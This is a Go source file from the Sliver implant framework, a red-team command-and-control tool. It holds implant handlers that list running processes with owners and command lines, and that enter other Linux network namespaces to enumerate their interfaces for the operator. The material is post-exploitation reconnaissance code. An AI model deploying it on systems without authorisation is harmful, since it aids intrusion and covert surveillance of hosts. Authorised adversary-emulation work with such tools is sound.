package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/ps"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"

	"golang.org/x/sys/unix"
)

func psHandler(data []byte, resp RPCResponse) {
	psListReq := &sliverpb.PsReq{}
	err := proto.Unmarshal(data, psListReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	procs, err := ps.Processes()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to list procs %v", err)
		// {{end}}
	}

	psList := &sliverpb.Ps{
		Processes: []*commonpb.Process{},
	}

	for _, proc := range procs {
		p := &commonpb.Process{
			Pid:          int32(proc.Pid()),
			Ppid:         int32(proc.PPid()),
			Executable:   proc.Executable(),
			Owner:        proc.Owner(),
			Architecture: proc.Architecture(),
		}
		p.CmdLine = proc.(*ps.UnixProcess).CmdLine()
		psList.Processes = append(psList.Processes, p)
	}
	data, err = proto.Marshal(psList)
	resp(data, err)
}

func getFdFromPath(path string) (int, error) {
	fd, err := unix.Open(path, unix.O_RDONLY|unix.O_CLOEXEC, 0)
	if err != nil {
		return -1, err
	}
	return fd, nil
}

func getUniqueFd(fd int) string {
	// Returns the unique namespace ID
	var s unix.Stat_t

	err := unix.Fstat(fd, &s)

	if err != nil {
		return "Unknown"
	}

	return fmt.Sprintf("NS(%d:%d)", s.Dev, s.Ino)
}

func nsLinuxIfconfig(interfaces *sliverpb.Ifconfig) {
	namespacesFound := make(map[uint64]string)

	procDir := "/proc"
	procContents, err := ioutil.ReadDir(procDir)

	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("error reading /proc: %v", err)
		//{{end}}
		return
	}

	for _, entry := range procContents {
		if !entry.IsDir() {
			continue
		}
		match, _ := filepath.Match("[1-9]*", entry.Name())
		if match {
			// Check if /proc/PID/net/ns exists
			checkPath := filepath.Join(procDir, entry.Name(), "/ns/net")

			if _, err := os.Stat(checkPath); !os.IsNotExist(err) {
				// path for /proc/PID/ns/net exists
				// inode used to track unique namespaces
				var inode uint64

				fileinfo, err := os.Stat(checkPath)

				if err != nil {
					//{{if .Config.Debug}}
					log.Printf("error : %v", err)
					//{{end}}
					continue
				}
				inode = fileinfo.Sys().(*syscall.Stat_t).Ino
				// Track unique namespaces
				namespacesFound[inode] = checkPath
			}

		}
	}

	// Lock the OS Thread so we don't accidentally switch namespaces
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Save the current network namespace
	origns, _ := getFdFromPath(fmt.Sprintf("/proc/%d/task/%d/ns/net", os.Getpid(), unix.Gettid()))
	defer unix.Close(origns)

	// We only need to use the path value
	for _, v := range namespacesFound {
		nsFd, err := unix.Open(v, unix.O_RDONLY|unix.O_CLOEXEC, 0)
		if err != nil {
			continue
		}
		// Ignore origin namespace
		if getUniqueFd(nsFd) == getUniqueFd(origns) {
			continue
		}

		err = unix.Setns(nsFd, unix.CLONE_NEWNET)

		if err != nil {
			// Failed to enter namespace
			continue
		}

		ifaces, _ := net.Interfaces()
		// {{if .Config.Debug}}
		log.Printf("Interfaces: %v\n", ifaces)
		// {{end}}
		ifconfigParseInterfaces(ifaces, interfaces, getUniqueFd(nsFd))
	}
	// Switch back to the original namespace
	unix.Setns(origns, unix.CLONE_NEWNET)
}
